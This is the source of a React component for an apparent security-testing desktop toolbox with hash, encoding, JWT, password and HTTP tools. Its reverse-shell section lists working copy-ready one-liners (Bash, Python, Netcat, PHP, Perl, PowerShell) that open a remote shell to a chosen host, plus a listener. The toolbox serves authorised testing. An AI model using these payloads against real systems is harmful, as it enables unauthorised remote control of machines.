import { useState, useCallback } from "react";
import { Hash, Code, Globe, Terminal, Copy, Check, Key, Send, Shield } from "lucide-react";
import { useT } from "../../i18n";

type ToolTab = "hash" | "encode" | "revshell" | "jwt" | "passgen" | "http";

const toolTabDefs: { id: ToolTab; icon: typeof Hash; labelKey: string }[] = [
  { id: "hash", icon: Hash, labelKey: "hacking.hash" },
  { id: "encode", icon: Code, labelKey: "hacking.encode" },
  { id: "revshell", icon: Terminal, labelKey: "hacking.revShell" },
  { id: "jwt", icon: Shield, labelKey: "hacking.jwt" },
  { id: "passgen", icon: Key, labelKey: "hacking.passGen" },
  { id: "http", icon: Send, labelKey: "hacking.httpForge" },
];

let invokeCache: typeof import("@tauri-apps/api/core")["invoke"] | null = null;
async function getInvoke() {
  if (!invokeCache) invokeCache = (await import("@tauri-apps/api/core")).invoke;
  return invokeCache;
}

function CopyButton({ text }: { text: string }) {
  const t = useT();
  const [copied, setCopied] = useState(false);
  return (
    <button
      onClick={() => {
        navigator.clipboard.writeText(text).catch(() => {});
        setCopied(true);
        setTimeout(() => setCopied(false), 1500);
      }}
      style={{
        background: "none",
        border: "none",
        color: copied ? "#00ff41" : "var(--text-muted)",
        cursor: "pointer",
        padding: 2,
      }}
      title={copied ? t("common.copied") : t("common.copy")}
    >
      {copied ? <Check size={10} /> : <Copy size={10} />}
    </button>
  );
}

function ResultBox({ label, value }: { label: string; value: string }) {
  if (!value) return null;
  return (
    <div style={{ marginBottom: 6 }}>
      <div style={{ display: "flex", alignItems: "center", gap: 4, marginBottom: 2 }}>
        <span style={{ fontSize: 9, color: "var(--text-muted)", fontWeight: 600 }}>{label}</span>
        <CopyButton text={value} />
      </div>
      <div
        style={{
          background: "var(--bg-primary)",
          border: "1px solid var(--border-subtle)",
          borderRadius: "var(--radius-sm)",
          padding: "4px 8px",
          fontSize: 10,
          fontFamily: "'JetBrains Mono', monospace",
          color: "var(--text-primary)",
          wordBreak: "break-all",
          userSelect: "all",
        }}
      >
        {value}
      </div>
    </div>
  );
}

function HashTool() {
  const t = useT();
  const [input, setInput] = useState("");
  const [hashes, setHashes] = useState<{ md5: string; sha1: string; sha256: string }>({ md5: "", sha1: "", sha256: "" });

  const computeHashes = async () => {
    if (!input) return;
    const encoder = new TextEncoder();
    const data = encoder.encode(input);
    const [sha1Buf, sha256Buf] = await Promise.all([
      crypto.subtle.digest("SHA-1", data),
      crypto.subtle.digest("SHA-256", data),
    ]);
    const toHex = (buf: ArrayBuffer) =>
      Array.from(new Uint8Array(buf))
        .map((b) => b.toString(16).padStart(2, "0"))
        .join("");

    // MD5 not available in SubtleCrypto, compute simple version
    const md5 = simpleMD5(input);

    setHashes({
      md5,
      sha1: toHex(sha1Buf),
      sha256: toHex(sha256Buf),
    });
  };

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
      <textarea
        value={input}
        onChange={(e) => setInput(e.target.value)}
        placeholder={t("hacking.enterTextHash")}
        style={{
          background: "var(--bg-primary)",
          border: "1px solid var(--border-subtle)",
          borderRadius: "var(--radius-sm)",
          color: "var(--text-primary)",
          padding: "6px 8px",
          fontSize: 11,
          fontFamily: "'JetBrains Mono', monospace",
          resize: "vertical",
          minHeight: 50,
          outline: "none",
        }}
      />
      <button
        onClick={computeHashes}
        disabled={!input.trim()}
        style={{
          background: input.trim() ? "var(--accent-primary)" : "var(--bg-active)",
          border: "none",
          borderRadius: "var(--radius-sm)",
          color: input.trim() ? "#000" : "var(--text-muted)",
          padding: "5px 12px",
          fontSize: 10,
          fontWeight: 700,
          cursor: input.trim() ? "pointer" : "default",
        }}
      >
        <Hash size={10} style={{ marginRight: 4, verticalAlign: "middle" }} />
        {t("hacking.computeHashes")}
      </button>
      <ResultBox label="MD5" value={hashes.md5} />
      <ResultBox label="SHA-1" value={hashes.sha1} />
      <ResultBox label="SHA-256" value={hashes.sha256} />
    </div>
  );
}

function EncodeTool() {
  const t = useT();
  const [input, setInput] = useState("");
  const [mode, setMode] = useState<"base64" | "url" | "hex">("base64");

  const encode = (): string => {
    if (!input) return "";
    try {
      if (mode === "base64") {
        const bytes = new TextEncoder().encode(input);
        let binary = "";
        bytes.forEach((b) => binary += String.fromCharCode(b));
        return btoa(binary);
      }
      if (mode === "url") return encodeURIComponent(input);
      if (mode === "hex")
        return Array.from(new TextEncoder().encode(input))
          .map((b) => b.toString(16).padStart(2, "0"))
          .join("");
    } catch { return "Error encoding"; }
    return "";
  };

  const decode = (): string => {
    if (!input) return "";
    try {
      if (mode === "base64") {
        const binary = atob(input);
        const bytes = Uint8Array.from(binary, (c) => c.charCodeAt(0));
        return new TextDecoder().decode(bytes);
      }
      if (mode === "url") return decodeURIComponent(input);
      if (mode === "hex") {
        const bytes = input.match(/.{1,2}/g)?.map((b) => parseInt(b, 16)) || [];
        return new TextDecoder().decode(new Uint8Array(bytes));
      }
    } catch { return "Error decoding"; }
    return "";
  };

  const modes = [
    { id: "base64" as const, label: "Base64" },
    { id: "url" as const, label: "URL" },
    { id: "hex" as const, label: "Hex" },
  ];

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
      <div style={{ display: "flex", gap: 4 }}>
        {modes.map((m) => (
          <button
            key={m.id}
            onClick={() => setMode(m.id)}
            style={{
              flex: 1,
              padding: "3px 6px",
              fontSize: 9,
              fontWeight: 600,
              borderRadius: 8,
              border: "1px solid",
              borderColor: mode === m.id ? "var(--accent-primary)" : "var(--border-subtle)",
              background: mode === m.id ? "var(--accent-primary)" : "var(--bg-tertiary)",
              color: mode === m.id ? "#000" : "var(--text-secondary)",
              cursor: "pointer",
            }}
          >
            {m.label}
          </button>
        ))}
      </div>
      <textarea
        value={input}
        onChange={(e) => setInput(e.target.value)}
        placeholder={t("hacking.enterTextEncode")}
        style={{
          background: "var(--bg-primary)",
          border: "1px solid var(--border-subtle)",
          borderRadius: "var(--radius-sm)",
          color: "var(--text-primary)",
          padding: "6px 8px",
          fontSize: 11,
          fontFamily: "'JetBrains Mono', monospace",
          resize: "vertical",
          minHeight: 50,
          outline: "none",
        }}
      />
      <ResultBox label={`Encoded (${mode})`} value={encode()} />
      <ResultBox label={`Decoded (${mode})`} value={decode()} />
    </div>
  );
}

const REVSHELL_TEMPLATES = [
  {
    name: "Bash TCP",
    cmd: (ip: string, port: string) => `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
  },
  {
    name: "Python",
    cmd: (ip: string, port: string) =>
      `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
  },
  {
    name: "Netcat -e",
    cmd: (ip: string, port: string) => `nc -e /bin/sh ${ip} ${port}`,
  },
  {
    name: "Netcat FIFO",
    cmd: (ip: string, port: string) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
  },
  {
    name: "PHP",
    cmd: (ip: string, port: string) =>
      `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
  },
  {
    name: "Perl",
    cmd: (ip: string, port: string) =>
      `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
  },
  {
    name: "PowerShell",
    cmd: (ip: string, port: string) =>
      `powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"`,
  },
  {
    name: "Listener (nc)",
    cmd: (_ip: string, port: string) => `nc -lvnp ${port}`,
  },
];

function RevShellTool() {
  const t = useT();
  const [ip, setIp] = useState("10.10.10.10");
  const [port, setPort] = useState("4444");

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
      <div style={{
        padding: "6px 10px",
        background: "rgba(255,0,64,0.08)",
        border: "1px solid rgba(255,0,64,0.2)",
        borderRadius: "var(--radius-sm)",
        fontSize: 9,
        color: "#ff6080",
      }}>
        {t("hacking.authorizedOnly")}
      </div>
      <div style={{ display: "flex", gap: 6 }}>
        <div style={{ flex: 1 }}>
          <label style={{ fontSize: 9, color: "var(--text-muted)", display: "block", marginBottom: 2 }}>
            <Globe size={9} style={{ verticalAlign: "middle", marginRight: 3 }} />LHOST
          </label>
          <input
            value={ip}
            onChange={(e) => setIp(e.target.value)}
            style={{
              width: "100%",
              background: "var(--bg-primary)",
              border: "1px solid var(--border-subtle)",
              borderRadius: "var(--radius-sm)",
              color: "var(--text-primary)",
              padding: "4px 8px",
              fontSize: 11,
              fontFamily: "'JetBrains Mono', monospace",
              outline: "none",
            }}
          />
        </div>
        <div style={{ width: 70 }}>
          <label style={{ fontSize: 9, color: "var(--text-muted)", display: "block", marginBottom: 2 }}>LPORT</label>
          <input
            value={port}
            onChange={(e) => setPort(e.target.value)}
            style={{
              width: "100%",
              background: "var(--bg-primary)",
              border: "1px solid var(--border-subtle)",
              borderRadius: "var(--radius-sm)",
              color: "var(--text-primary)",
              padding: "4px 8px",
              fontSize: 11,
              fontFamily: "'JetBrains Mono', monospace",
              outline: "none",
            }}
          />
        </div>
      </div>
      <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
        {REVSHELL_TEMPLATES.map((tpl, i) => {
          const cmd = tpl.cmd(ip, port);
          return (
            <div
              key={i}
              style={{
                background: "var(--bg-tertiary)",
                border: "1px solid var(--border-subtle)",
                borderRadius: "var(--radius-sm)",
                padding: "6px 8px",
              }}
            >
              <div style={{ display: "flex", alignItems: "center", gap: 4, marginBottom: 4 }}>
                <span style={{ fontSize: 10, fontWeight: 700, color: "var(--accent-primary)", flex: 1 }}>
                  {tpl.name}
                </span>
                <CopyButton text={cmd} />
              </div>
              <pre
                style={{
                  margin: 0,
                  fontSize: 9,
                  fontFamily: "'JetBrains Mono', monospace",
                  color: "var(--text-secondary)",
                  whiteSpace: "pre-wrap",
                  wordBreak: "break-all",
                  lineHeight: 1.4,
                }}
              >
                {cmd}
              </pre>
            </div>
          );
        })}
      </div>
    </div>
  );
}

// ── JWT Decoder ──

function JwtTool() {
  const t = useT();
  const [token, setToken] = useState("");

  const decoded = (() => {
    if (!token.trim()) return null;
    const parts = token.trim().split(".");
    if (parts.length !== 3) return null;
    try {
      const decodeB64 = (s: string) => {
        const pad = s.length % 4 === 0 ? s : s + "=".repeat(4 - (s.length % 4));
        return JSON.parse(atob(pad.replace(/-/g, "+").replace(/_/g, "/")));
      };
      const header = decodeB64(parts[0]);
      const payload = decodeB64(parts[1]);
      const exp = payload.exp ? payload.exp * 1000 : null;
      const isExpired = exp ? Date.now() > exp : null;
      const iat = payload.iat ? new Date(payload.iat * 1000).toISOString() : null;
      const expDate = exp ? new Date(exp).toISOString() : null;
      return { header, payload, signature: parts[2], exp, isExpired, iat, expDate };
    } catch {
      return null;
    }
  })();

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
      <textarea
        value={token}
        onChange={(e) => setToken(e.target.value)}
        placeholder={t("hacking.jwtInput")}
        style={{
          background: "var(--bg-primary)", border: "1px solid var(--border-subtle)",
          borderRadius: "var(--radius-sm)", color: "var(--text-primary)",
          padding: "6px 8px", fontSize: 10, fontFamily: "'JetBrains Mono', monospace",
          resize: "vertical", minHeight: 50, outline: "none",
        }}
      />
      {token.trim() && !decoded && (
        <div style={{ color: "#ff6080", fontSize: 10 }}>{t("hacking.invalidJwt")}</div>
      )}
      {decoded && (
        <>
          {/* Expiration badge */}
          {decoded.isExpired !== null && (
            <div style={{
              display: "flex", alignItems: "center", gap: 6,
              padding: "4px 8px", borderRadius: "var(--radius-sm)",
              background: decoded.isExpired ? "rgba(255,0,64,0.1)" : "rgba(0,255,65,0.1)",
              border: `1px solid ${decoded.isExpired ? "rgba(255,0,64,0.3)" : "rgba(0,255,65,0.3)"}`,
            }}>
              <span style={{
                fontSize: 10, fontWeight: 700,
                color: decoded.isExpired ? "#ff6080" : "#00ff41",
              }}>
                {decoded.isExpired ? t("hacking.jwtExpired") : t("hacking.jwtValid")}
              </span>
              {decoded.expDate && (
                <span style={{ fontSize: 9, color: "var(--text-muted)" }}>
                  exp: {decoded.expDate}
                </span>
              )}
            </div>
          )}
          <ResultBox label={t("hacking.jwtHeader")} value={JSON.stringify(decoded.header, null, 2)} />
          <ResultBox label={t("hacking.jwtPayload")} value={JSON.stringify(decoded.payload, null, 2)} />
          <ResultBox label={t("hacking.jwtSignature")} value={decoded.signature} />
        </>
      )}
    </div>
  );
}

// ── Password Generator ──

function PassGenTool() {
  const t = useT();
  const [length, setLength] = useState(20);
  const [upper, setUpper] = useState(true);
  const [lower, setLower] = useState(true);
  const [digits, setDigits] = useState(true);
  const [symbols, setSymbols] = useState(true);
  const [password, setPassword] = useState("");

  const generate = useCallback(() => {
    let charset = "";
    if (upper) charset += "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    if (lower) charset += "abcdefghijklmnopqrstuvwxyz";
    if (digits) charset += "0123456789";
    if (symbols) charset += "!@#$%^&*()-_=+[]{}|;:,.<>?";
    if (!charset) charset = "abcdefghijklmnopqrstuvwxyz";

    const arr = new Uint32Array(length);
    crypto.getRandomValues(arr);
    const pass = Array.from(arr, (v) => charset[v % charset.length]).join("");
    setPassword(pass);
  }, [length, upper, lower, digits, symbols]);

  const charsetSize = (upper ? 26 : 0) + (lower ? 26 : 0) + (digits ? 10 : 0) + (symbols ? 27 : 0) || 26;
  const entropy = Math.floor(length * Math.log2(charsetSize));
  const strengthColor = entropy < 40 ? "#ff4444" : entropy < 60 ? "#d29922" : entropy < 80 ? "#ffaf00" : "#00ff41";
  const strengthLabel = entropy < 40 ? t("hacking.passWeak") : entropy < 60 ? t("hacking.passFair") : entropy < 80 ? t("hacking.passGood") : t("hacking.passStrong");

  const Toggle = ({ label, checked, onChange }: { label: string; checked: boolean; onChange: () => void }) => (
    <button
      onClick={onChange}
      style={{
        flex: 1, padding: "3px 4px", fontSize: 9, fontWeight: 600, borderRadius: 6,
        border: "1px solid",
        borderColor: checked ? "var(--accent-primary)" : "var(--border-subtle)",
        background: checked ? "var(--accent-primary)" : "var(--bg-tertiary)",
        color: checked ? "#000" : "var(--text-muted)",
        cursor: "pointer",
      }}
    >
      {label}
    </button>
  );

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
      {/* Length */}
      <div>
        <div style={{ display: "flex", alignItems: "center", gap: 6, marginBottom: 4 }}>
          <span style={{ fontSize: 9, color: "var(--text-muted)" }}>{t("hacking.passLength")}: <strong style={{ color: "var(--text-primary)" }}>{length}</strong></span>
          <span style={{ fontSize: 9, color: strengthColor, fontWeight: 700, marginLeft: "auto" }}>
            {entropy} bits — {strengthLabel}
          </span>
        </div>
        <input
          type="range" min={4} max={128} value={length}
          onChange={(e) => setLength(parseInt(e.target.value))}
          style={{ width: "100%", accentColor: strengthColor }}
        />
        {/* Entropy bar */}
        <div style={{ height: 3, background: "var(--bg-primary)", borderRadius: 2, marginTop: 4 }}>
          <div style={{ height: "100%", width: `${Math.min(entropy, 128) / 128 * 100}%`, background: strengthColor, borderRadius: 2, transition: "width 0.2s" }} />
        </div>
      </div>

      {/* Charset toggles */}
      <div style={{ display: "flex", gap: 4 }}>
        <Toggle label="ABC" checked={upper} onChange={() => setUpper(!upper)} />
        <Toggle label="abc" checked={lower} onChange={() => setLower(!lower)} />
        <Toggle label="123" checked={digits} onChange={() => setDigits(!digits)} />
        <Toggle label="!@#" checked={symbols} onChange={() => setSymbols(!symbols)} />
      </div>

      <button
        onClick={generate}
        style={{
          background: "var(--accent-primary)", border: "none", borderRadius: "var(--radius-sm)",
          color: "#000", padding: "5px 12px", fontSize: 10, fontWeight: 700, cursor: "pointer",
        }}
      >
        <Key size={10} style={{ marginRight: 4, verticalAlign: "middle" }} />
        {t("hacking.generate")}
      </button>

      {password && <ResultBox label={t("hacking.password")} value={password} />}
    </div>
  );
}

// ── HTTP Request Forge ──

interface ForgeResponse {
  status: number; status_text: string; headers: [string, string][];
  body: string; time_ms: number;
}

function HttpForgeTool() {
  const t = useT();
  const [method, setMethod] = useState("GET");
  const [url, setUrl] = useState("https://");
  const [headerRows, setHeaderRows] = useState<{ key: string; value: string }[]>([{ key: "", value: "" }]);
  const [body, setBody] = useState("");
  const [response, setResponse] = useState<ForgeResponse | null>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"];

  const send = useCallback(async () => {
    setLoading(true);
    setError("");
    setResponse(null);
    try {
      const invoke = await getInvoke();
      const headers = headerRows.filter((h) => h.key.trim()).map((h) => [h.key, h.value] as [string, string]);
      const res = await invoke<ForgeResponse>("hacking_http_forge", {
        request: { method, url, headers, body },
      });
      setResponse(res);
    } catch (e: any) {
      setError(e?.toString() || "Request failed");
    }
    setLoading(false);
  }, [method, url, headerRows, body]);

  const statusColor = (s: number) => s < 300 ? "#00ff41" : s < 400 ? "#58a6ff" : s < 500 ? "#d29922" : "#ff4444";

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
      {/* Method + URL */}
      <div style={{ display: "flex", gap: 4 }}>
        <select
          value={method}
          onChange={(e) => setMethod(e.target.value)}
          style={{
            width: 80, background: "var(--bg-primary)", border: "1px solid var(--border-subtle)",
            borderRadius: "var(--radius-sm)", color: "var(--accent-primary)",
            padding: "4px 4px", fontSize: 10, fontWeight: 700, fontFamily: "monospace", outline: "none",
          }}
        >
          {methods.map((m) => <option key={m} value={m}>{m}</option>)}
        </select>
        <input
          value={url}
          onChange={(e) => setUrl(e.target.value)}
          placeholder="https://example.com/api"
          onKeyDown={(e) => e.key === "Enter" && send()}
          style={{
            flex: 1, background: "var(--bg-primary)", border: "1px solid var(--border-subtle)",
            borderRadius: "var(--radius-sm)", color: "var(--text-primary)",
            padding: "4px 8px", fontSize: 10, fontFamily: "'JetBrains Mono', monospace", outline: "none",
          }}
        />
        <button
          onClick={send}
          disabled={loading}
          style={{
            background: loading ? "var(--bg-active)" : "var(--accent-primary)",
            border: "none", borderRadius: "var(--radius-sm)",
            color: loading ? "var(--text-muted)" : "#000",
            padding: "4px 12px", fontSize: 10, fontWeight: 700, cursor: loading ? "default" : "pointer",
          }}
        >
          <Send size={10} style={{ marginRight: 3, verticalAlign: "middle" }} />
          {loading ? "..." : t("hacking.send")}
        </button>
      </div>

      {/* Headers */}
      <div>
        <div style={{ fontSize: 9, color: "var(--text-muted)", marginBottom: 2, fontWeight: 600 }}>{t("hacking.httpHeaders")}</div>
        {headerRows.map((row, i) => (
          <div key={i} style={{ display: "flex", gap: 4, marginBottom: 2 }}>
            <input
              value={row.key}
              onChange={(e) => {
                const rows = [...headerRows];
                rows[i] = { ...rows[i], key: e.target.value };
                setHeaderRows(rows);
              }}
              placeholder="Header"
              style={{
                flex: 1, background: "var(--bg-primary)", border: "1px solid var(--border-subtle)",
                borderRadius: "var(--radius-sm)", color: "var(--text-primary)",
                padding: "2px 6px", fontSize: 9, fontFamily: "monospace", outline: "none",
              }}
            />
            <input
              value={row.value}
              onChange={(e) => {
                const rows = [...headerRows];
                rows[i] = { ...rows[i], value: e.target.value };
                setHeaderRows(rows);
              }}
              placeholder="Value"
              style={{
                flex: 2, background: "var(--bg-primary)", border: "1px solid var(--border-subtle)",
                borderRadius: "var(--radius-sm)", color: "var(--text-primary)",
                padding: "2px 6px", fontSize: 9, fontFamily: "monospace", outline: "none",
              }}
            />
            <button
              onClick={() => {
                if (headerRows.length > 1) setHeaderRows(headerRows.filter((_, j) => j !== i));
              }}
              style={{ background: "none", border: "none", color: "var(--text-muted)", cursor: "pointer", fontSize: 12, padding: "0 4px" }}
            >
              x
            </button>
          </div>
        ))}
        <button
          onClick={() => setHeaderRows([...headerRows, { key: "", value: "" }])}
          style={{
            background: "none", border: "1px dashed var(--border-subtle)", borderRadius: "var(--radius-sm)",
            color: "var(--text-muted)", padding: "2px 8px", fontSize: 9, cursor: "pointer", width: "100%",
          }}
        >
          {t("hacking.addHeader")}
        </button>
      </div>

      {/* Body */}
      {(method === "POST" || method === "PUT" || method === "PATCH") && (
        <div>
          <div style={{ fontSize: 9, color: "var(--text-muted)", marginBottom: 2, fontWeight: 600 }}>{t("hacking.httpBody")}</div>
          <textarea
            value={body}
            onChange={(e) => setBody(e.target.value)}
            placeholder='{"key": "value"}'
            style={{
              width: "100%", background: "var(--bg-primary)", border: "1px solid var(--border-subtle)",
              borderRadius: "var(--radius-sm)", color: "var(--text-primary)",
              padding: "4px 8px", fontSize: 10, fontFamily: "'JetBrains Mono', monospace",
              resize: "vertical", minHeight: 40, outline: "none",
            }}
          />
        </div>
      )}

      {error && <div style={{ color: "#ff6080", fontSize: 10 }}>{error}</div>}

      {/* Response */}
      {response && (
        <div style={{
          background: "var(--bg-tertiary)", border: "1px solid var(--border-subtle)",
          borderRadius: "var(--radius-sm)", overflow: "hidden",
        }}>
          {/* Status bar */}
          <div style={{
            display: "flex", alignItems: "center", gap: 8, padding: "4px 8px",
            borderBottom: "1px solid var(--border-subtle)", background: "var(--bg-primary)",
          }}>
            <span style={{
              padding: "1px 8px", borderRadius: 8, fontSize: 10, fontWeight: 700,
              color: "#000", background: statusColor(response.status),
            }}>
              {response.status} {response.status_text}
            </span>
            <span style={{ fontSize: 9, color: "var(--text-muted)", marginLeft: "auto" }}>
              {response.time_ms}ms
            </span>
          </div>
          {/* Response headers */}
          <div style={{ padding: "4px 8px", borderBottom: "1px solid var(--border-subtle)", maxHeight: 100, overflowY: "auto" }}>
            {response.headers.map(([k, v], i) => (
              <div key={i} style={{ fontSize: 9, color: "var(--text-muted)", fontFamily: "monospace" }}>
                <span style={{ color: "var(--accent-primary)" }}>{k}</span>: {v}
              </div>
            ))}
          </div>
          {/* Response body */}
          <pre style={{
            margin: 0, padding: 8, fontSize: 9, fontFamily: "'JetBrains Mono', monospace",
            color: "var(--text-primary)", whiteSpace: "pre-wrap", wordBreak: "break-all",
            maxHeight: 300, overflowY: "auto",
          }}>
            {(() => {
              try { return JSON.stringify(JSON.parse(response.body), null, 2); } catch { return response.body; }
            })()}
          </pre>
        </div>
      )}
    </div>
  );
}

export function ToolsView() {
  const t = useT();
  const [activeTab, setActiveTab] = useState<ToolTab>("hash");

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
      {/* Tool tabs - 2 rows for 6 tools */}
      <div style={{ display: "flex", flexDirection: "column", gap: 3 }}>
        <div style={{ display: "flex", gap: 4 }}>
          {toolTabDefs.slice(0, 3).map((tab) => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              style={{
                flex: 1, display: "flex", alignItems: "center", justifyContent: "center",
                gap: 3, padding: "4px 6px", fontSize: 9, fontWeight: 600, borderRadius: 8,
                border: "1px solid",
                borderColor: activeTab === tab.id ? "var(--accent-primary)" : "var(--border-subtle)",
                background: activeTab === tab.id ? "var(--accent-primary)" : "var(--bg-tertiary)",
                color: activeTab === tab.id ? "#000" : "var(--text-secondary)",
                cursor: "pointer",
              }}
            >
              <tab.icon size={10} />
              {t(tab.labelKey)}
            </button>
          ))}
        </div>
        <div style={{ display: "flex", gap: 4 }}>
          {toolTabDefs.slice(3).map((tab) => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              style={{
                flex: 1, display: "flex", alignItems: "center", justifyContent: "center",
                gap: 3, padding: "4px 6px", fontSize: 9, fontWeight: 600, borderRadius: 8,
                border: "1px solid",
                borderColor: activeTab === tab.id ? "var(--accent-primary)" : "var(--border-subtle)",
                background: activeTab === tab.id ? "var(--accent-primary)" : "var(--bg-tertiary)",
                color: activeTab === tab.id ? "#000" : "var(--text-secondary)",
                cursor: "pointer",
              }}
            >
              <tab.icon size={10} />
              {t(tab.labelKey)}
            </button>
          ))}
        </div>
      </div>

      {/* Tool content */}
      <div>
        {activeTab === "hash" && <HashTool />}
        {activeTab === "encode" && <EncodeTool />}
        {activeTab === "revshell" && <RevShellTool />}
        {activeTab === "jwt" && <JwtTool />}
        {activeTab === "passgen" && <PassGenTool />}
        {activeTab === "http" && <HttpForgeTool />}
      </div>
    </div>
  );
}

// Simple MD5 implementation (for convenience — not cryptographically used)
function simpleMD5(str: string): string {
  function md5cycle(x: number[], k: number[]) {
    let a = x[0], b = x[1], c = x[2], d = x[3];
    a = ff(a,b,c,d,k[0],7,-680876936); d = ff(d,a,b,c,k[1],12,-389564586); c = ff(c,d,a,b,k[2],17,606105819); b = ff(b,c,d,a,k[3],22,-1044525330);
    a = ff(a,b,c,d,k[4],7,-176418897); d = ff(d,a,b,c,k[5],12,1200080426); c = ff(c,d,a,b,k[6],17,-1473231341); b = ff(b,c,d,a,k[7],22,-45705983);
    a = ff(a,b,c,d,k[8],7,1770035416); d = ff(d,a,b,c,k[9],12,-1958414417); c = ff(c,d,a,b,k[10],17,-42063); b = ff(b,c,d,a,k[11],22,-1990404162);
    a = ff(a,b,c,d,k[12],7,1804603682); d = ff(d,a,b,c,k[13],12,-40341101); c = ff(c,d,a,b,k[14],17,-1502002290); b = ff(b,c,d,a,k[15],22,1236535329);
    a = gg(a,b,c,d,k[1],5,-165796510); d = gg(d,a,b,c,k[6],9,-1069501632); c = gg(c,d,a,b,k[11],14,643717713); b = gg(b,c,d,a,k[0],20,-373897302);
    a = gg(a,b,c,d,k[5],5,-701558691); d = gg(d,a,b,c,k[10],9,38016083); c = gg(c,d,a,b,k[15],14,-660478335); b = gg(b,c,d,a,k[4],20,-405537848);
    a = gg(a,b,c,d,k[9],5,568446438); d = gg(d,a,b,c,k[14],9,-1019803690); c = gg(c,d,a,b,k[3],14,-187363961); b = gg(b,c,d,a,k[8],20,1163531501);
    a = gg(a,b,c,d,k[13],5,-1444681467); d = gg(d,a,b,c,k[2],9,-51403784); c = gg(c,d,a,b,k[7],14,1735328473); b = gg(b,c,d,a,k[12],20,-1926607734);
    a = hh(a,b,c,d,k[5],4,-378558); d = hh(d,a,b,c,k[8],11,-2022574463); c = hh(c,d,a,b,k[11],16,1839030562); b = hh(b,c,d,a,k[14],23,-35309556);
    a = hh(a,b,c,d,k[1],4,-1530992060); d = hh(d,a,b,c,k[4],11,1272893353); c = hh(c,d,a,b,k[7],16,-155497632); b = hh(b,c,d,a,k[10],23,-1094730640);
    a = hh(a,b,c,d,k[13],4,681279174); d = hh(d,a,b,c,k[0],11,-358537222); c = hh(c,d,a,b,k[3],16,-722521979); b = hh(b,c,d,a,k[6],23,76029189);
    a = hh(a,b,c,d,k[9],4,-640364487); d = hh(d,a,b,c,k[12],11,-421815835); c = hh(c,d,a,b,k[15],16,530742520); b = hh(b,c,d,a,k[2],23,-995338651);
    a = ii(a,b,c,d,k[0],6,-198630844); d = ii(d,a,b,c,k[7],10,1126891415); c = ii(c,d,a,b,k[14],15,-1416354905); b = ii(b,c,d,a,k[5],21,-57434055);
    a = ii(a,b,c,d,k[12],6,1700485571); d = ii(d,a,b,c,k[3],10,-1894986606); c = ii(c,d,a,b,k[10],15,-1051523); b = ii(b,c,d,a,k[1],21,-2054922799);
    a = ii(a,b,c,d,k[8],6,1873313359); d = ii(d,a,b,c,k[15],10,-30611744); c = ii(c,d,a,b,k[6],15,-1560198380); b = ii(b,c,d,a,k[13],21,1309151649);
    a = ii(a,b,c,d,k[4],6,-145523070); d = ii(d,a,b,c,k[11],10,-1120210379); c = ii(c,d,a,b,k[2],15,718787259); b = ii(b,c,d,a,k[9],21,-343485551);
    x[0] = add32(a, x[0]); x[1] = add32(b, x[1]); x[2] = add32(c, x[2]); x[3] = add32(d, x[3]);
  }
  function cmn(q: number, a: number, b: number, x: number, s: number, t: number) {
    a = add32(add32(a, q), add32(x, t));
    return add32((a << s) | (a >>> (32 - s)), b);
  }
  function ff(a: number, b: number, c: number, d: number, x: number, s: number, t: number) { return cmn((b & c) | ((~b) & d), a, b, x, s, t); }
  function gg(a: number, b: number, c: number, d: number, x: number, s: number, t: number) { return cmn((b & d) | (c & (~d)), a, b, x, s, t); }
  function hh(a: number, b: number, c: number, d: number, x: number, s: number, t: number) { return cmn(b ^ c ^ d, a, b, x, s, t); }
  function ii(a: number, b: number, c: number, d: number, x: number, s: number, t: number) { return cmn(c ^ (b | (~d)), a, b, x, s, t); }
  function md51(s: string) {
    const n = s.length;
    let state = [1732584193, -271733879, -1732584194, 271733878];
    let i: number;
    for (i = 64; i <= n; i += 64) {
      const block: number[] = [];
      for (let j = i - 64; j < i; j += 4)
        block.push(s.charCodeAt(j) + (s.charCodeAt(j + 1) << 8) + (s.charCodeAt(j + 2) << 16) + (s.charCodeAt(j + 3) << 24));
      md5cycle(state, block);
    }
    const tail: number[] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
    for (let j = 0; j < n % 64; j++)
      tail[j >> 2] |= s.charCodeAt(i - 64 + j) << ((j % 4) << 3);
    tail[(n % 64) >> 2] |= 0x80 << (((n % 64) % 4) << 3);
    if (n % 64 > 55) {
      md5cycle(state, tail);
      for (let j = 0; j < 16; j++) tail[j] = 0;
    }
    tail[14] = n * 8;
    md5cycle(state, tail);
    return state;
  }
